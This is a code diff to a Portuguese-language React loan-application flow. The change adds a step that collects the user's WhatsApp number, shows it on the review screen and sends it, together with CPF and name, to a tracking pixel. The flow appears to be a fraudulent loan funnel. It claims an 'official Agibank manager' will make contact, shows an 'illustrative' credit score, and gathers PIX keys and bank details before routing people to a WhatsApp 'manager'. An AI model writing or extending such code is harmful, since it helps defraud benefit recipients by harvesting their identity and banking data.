@@ -3,7 +3,7 @@ import { useServerFn } from "@tanstack/react-start";
 import { toast } from "sonner";
 import {
   ArrowLeft, ArrowRight, BadgeCheck, Building2, CheckCircle2, FileCheck2, Landmark,
-  Loader2, Lock, MessageCircle, ShieldCheck, Sparkles, TrendingUp, UserRound, Wallet,
+  Loader2, Lock, MessageCircle, Phone, ShieldCheck, Sparkles, TrendingUp, UserRound, Wallet,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -19,7 +19,7 @@ import { ScoreGauge } from "./ScoreGauge";
 import { BankLogo } from "./BankLogo";
 import {
   BANKS, DURATIONS, PROFILES, RANGES, REASONS, brl, isValidAccount, isValidAgency, isValidCPF,
-  isValidPix, maskAccount, maskCPF, maskPhone, onlyDigits,
+  isValidPix, isValidPhone, maskAccount, maskCPF, maskPhone, onlyDigits,
   scoreLabel, type Duration, type PixType, type Profile, type Range, type Reason,
 } from "@/lib/loan";
 
@@ -43,11 +43,11 @@ const MANAGER = "Lucas Cardoso";
 
 type Step =
   | "welcome" | "dados" | "validando" | "perfil" | "motivo" | "tempo" | "faixa" | "diretrizes"
-  | "analise" | "score" | "valor" | "bancos" | "recebimento" | "revisao" | "gerente" | "final";
+  | "analise" | "score" | "valor" | "bancos" | "recebimento" | "contato" | "revisao" | "gerente" | "final";
 
 const ORDER: Step[] = [
   "welcome", "dados", "validando", "perfil", "motivo", "tempo", "faixa", "diretrizes",
-  "analise", "score", "valor", "bancos", "recebimento", "revisao", "gerente", "final",
+  "analise", "score", "valor", "bancos", "recebimento", "contato", "revisao", "gerente", "final",
 ];
 
 export function LoanFlow() {
@@ -62,6 +62,7 @@ export function LoanFlow() {
   const [range, setRange] = useState<Range | null>(null);
   const [rules, setRules] = useState([false, false, false, false]);
   const [result, setResult] = useState<{ score: number; amount: number } | null>(null);
+  const [phone, setPhone] = useState("");
   const [banks, setBanks] = useState<string[]>([]);
   const [method, setMethod] = useState<"pix" | "conta">("pix");
   const [pixType, setPixType] = useState<PixType>("cpf");
@@ -119,12 +120,13 @@ export function LoanFlow() {
       valor: "valor_viewed",
       bancos: "bancos_selected",
       recebimento: "payout_entered",
+      contato: "whatsapp_entered",
       revisao: "review_accepted",
       gerente: "review_accepted",
       final: "whatsapp_clicked",
     };
 
-    const isPayoutStepOrLater = ["recebimento", "revisao", "gerente", "final"].includes(s);
+    const isPayoutStepOrLater = ["recebimento", "contato", "revisao", "gerente", "final"].includes(s);
     const hasPayoutData = method === "pix" ? Boolean(pixKey) : Boolean(account);
 
     const targetEvent = stepEventMap[s];
@@ -132,6 +134,7 @@ export function LoanFlow() {
       pixel.track(targetEvent, {
         cpf: cpf ? onlyDigits(cpf) : undefined,
         name: name || undefined,
+        phone: phone ? onlyDigits(phone) : undefined,
         profile: profile ? PROFILES[profile] : undefined,
         reason: reason ? REASONS[reason] : undefined,
         duration: duration ? DURATIONS[duration] : undefined,
@@ -220,8 +223,18 @@ export function LoanFlow() {
       if (!isValidAgency(agency)) return fail("Agência deve ter 4 dígitos, sem o dígito verificador.");
       if (!isValidAccount(account)) return fail("Conta inválida. Use o formato 12345-6.");
     }
-    go("revisao");
+    go("contato");
     return undefined;
+  };
+
+  const submitContato = () => {
+    if (!isValidPhone(phone)) {
+      setDadosErr({ phone: "Número de WhatsApp inválido com DDD (ex: 11 98888-7777)." });
+      fail("Informe um número de WhatsApp válido com DDD.");
+      return;
+    }
+    setDadosErr({});
+    go("revisao");
   };
 
   const finalize = () => {
@@ -418,13 +431,46 @@ export function LoanFlow() {
           </Card>
         )}
 
+        {step === "contato" && (
+          <Card
+            icon={<Phone />}
+            title="Seu WhatsApp para contato"
+            subtitle={`Informe seu WhatsApp com DDD para que o gerente ${managerName} possa entrar em contato direto para liberar seu empréstimo.`}
+          >
+            <Field label="WhatsApp com DDD" ok={isValidPhone(phone)} error={dadosErr.phone}>
+              <Input
+                type="tel"
+                inputMode="numeric"
+                maxLength={16}
+                value={phone}
+                placeholder="(00) 90000-0000"
+                onChange={(e) => {
+                  setDadosErr((prev) => ({ ...prev, phone: undefined }));
+                  setPhone(maskPhone(e.target.value));
+                }}
+              />
+            </Field>
+            <p className="text-xs text-muted-foreground leading-relaxed">
+              🔒 <b>Privacidade Garantida:</b> Seu contato será utilizado exclusivamente pelo gerente oficial do Agibank para validação e liberação do seu benefício.
+            </p>
+            <Secure />
+            <Nav onBack={back} disabled={!isValidPhone(phone)} onNext={submitContato} />
+          </Card>
+        )}
+
         {step === "revisao" && result && (
           <Card icon={<FileCheck2 />} title="Confirme suas informações" subtitle="Revise os dados antes de enviar ao seu gerente.">
             <dl className="divide-y rounded-xl border bg-muted/40 text-sm">
               {[
-                ["Titular", name ? name : "Consulta realizada pelo CPF"], ["CPF", cpf], ["Perfil", profile ? PROFILES[profile] : "Pendente"], ["Motivo", reason ? REASONS[reason] : "Pendente"],
-                ["Tempo de benefício", duration ? DURATIONS[duration] : "Pendente"], ["Faixa do benefício", range ? RANGES[range] : "Pendente"],
-                ["Score ilustrativo", `${result.score} · ${scoreLabel(result.score)}`], ["Valor estimado", brl(result.amount)],
+                ["Titular", name ? name : "Consulta realizada pelo CPF"],
+                ["CPF", cpf],
+                ["WhatsApp de Contato", phone ? phone : "Não informado"],
+                ["Perfil", profile ? PROFILES[profile] : "Pendente"],
+                ["Motivo", reason ? REASONS[reason] : "Pendente"],
+                ["Tempo de benefício", duration ? DURATIONS[duration] : "Pendente"],
+                ["Faixa do benefício", range ? RANGES[range] : "Pendente"],
+                ["Score ilustrativo", `${result.score} · ${scoreLabel(result.score)}`],
+                ["Valor estimado", brl(result.amount)],
                 ["Recebimento", method === "pix" ? `PIX (${pixType}) · ${pixKey}` : `${bankName} · Ag ${agency} · CC ${account}`],
               ].map(([k, v]) => (
                 <div key={k} className="grid grid-cols-[minmax(0,1fr)_minmax(0,1fr)] gap-3 px-4 py-3"><dt className="text-muted-foreground">{k}</dt><dd className="min-w-0 break-words text-right font-semibold">{v}</dd></div>
@@ -448,7 +494,7 @@ export function LoanFlow() {
                       range: range!,
                       reason: reason!,
                       fullName: name || "Titular Identificado",
-                      phone: "11999999999",
+                      phone: onlyDigits(phone) || "11999999999",
                       birthDate: birthDate ? birthDate.replace(/-/g, "/") : "01/01/1970",
                       profile: profile!,
                       otherBanks: banks,
@@ -524,7 +570,7 @@ const STAGES: { label: string; steps: Step[] }[] = [
   { label: "Dados", steps: ["dados", "validando"] },
   { label: "Perfil", steps: ["perfil", "motivo", "tempo", "faixa"] },
   { label: "Análise", steps: ["diretrizes", "analise", "score", "valor"] },
-  { label: "Recebimento", steps: ["bancos", "recebimento", "revisao"] },
+  { label: "Recebimento", steps: ["bancos", "recebimento", "contato", "revisao"] },
   { label: "Gerente", steps: ["gerente", "final"] },
 ];
 
